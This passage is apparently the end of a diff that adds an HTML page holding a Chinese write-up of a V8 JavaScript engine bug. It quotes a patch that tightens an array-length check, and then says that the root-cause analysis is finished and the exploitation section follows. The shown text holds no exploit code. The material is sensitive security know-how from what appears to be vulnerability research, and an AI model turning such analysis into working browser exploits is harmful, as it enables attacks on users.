+-      GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);
++      //    into excess elements or shrink the backing store as appropriate.
++      GotoIf(SmiNotEqual(length_smi, old_length), &amp;runtime);
+</code></pre><p>漏洞原因分析就到此位置了</p>
+<p>接下来我们来分析如何进行漏洞利用</p>
+
+</body>
+</html>
+<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
